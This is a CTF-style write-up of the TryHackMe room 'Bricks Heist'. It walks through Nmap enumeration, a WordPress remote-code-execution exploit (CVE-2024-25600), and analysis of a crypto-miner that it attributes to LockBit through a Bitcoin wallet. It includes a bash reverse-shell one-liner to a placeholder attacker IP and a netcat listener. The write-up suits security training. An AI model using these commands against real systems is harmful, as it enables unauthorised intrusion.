# TryHack3M: Bricks Heist — Write-Up

**Platform:** TryHackMe  
**Difficulty:** Easy–Medium  
**Category:** Web Exploitation, Incident Analysis  
**Status:** Completed

---

## Overview

This room focuses on exploiting a vulnerable WordPress installation, gaining remote code execution, and performing basic system investigation to identify malicious activity (crypto-mining).  
The challenge simulates a compromised web server scenario where post-exploitation analysis is required.

---

## Enumeration

Initial reconnaissance was performed using Nmap to identify exposed services:

```bash
nmap -sC -sV -oN nmap.txt bricks.thm

Key findings:

80/tcp – HTTP

443/tcp – HTTPS (WordPress)

22/tcp – SSH

3306/tcp – MySQL (no remote access)

Web Exploitation (WordPress RCE)

Further enumeration indicated the WordPress instance was vulnerable to CVE-2024-25600, allowing remote code execution via a vulnerable component.

A public proof-of-concept exploit was used to test the vulnerability:

python3 exploit.py -u https://bricks.thm


This provided a limited shell as the web server user.

Shell Access & Stabilization

To improve shell reliability, a reverse shell was spawned:

bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/1337 0>&1'


Listener:

nc -lvnp 1337

Flag Discovery

While enumerating the web directory, a hidden .txt file was discovered containing the first flag:

cat 650c844110baced87e1606453b93f22a.txt

THM{fl46_650c844110baced87e1606453b93f22a}

Process & Service Enumeration

Running services were listed:

systemctl list-units --type=service --state=running


One service stood out due to unusual naming and behavior. Inspecting the service revealed a custom binary running from a non-standard directory:

/lib/NetworkManager/

Log Analysis & Malware Identification

Inside the directory, a configuration/log file named inet.conf was found.
The contents indicated repeated execution consistent with crypto-mining behavior.

An encoded identifier inside the file was decoded, revealing a Bitcoin wallet address used by the miner.

Bitcoin Wallet
bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qa


Transaction analysis showed activity consistent with known malicious mining campaigns.

Threat Attribution

Based on wallet reuse and public blockchain intelligence, the activity was associated with the LockBit ransomware ecosystem.

Key Takeaways

WordPress vulnerabilities remain a common initial access vector

Always enumerate running services post-exploitation

Log files often reveal more than binaries

Basic blockchain analysis can assist threat attribution

Skills Demonstrated

Network & web enumeration

WordPress exploitation (RCE)

Linux service & process analysis

Log inspection

Threat intelligence correlaretion
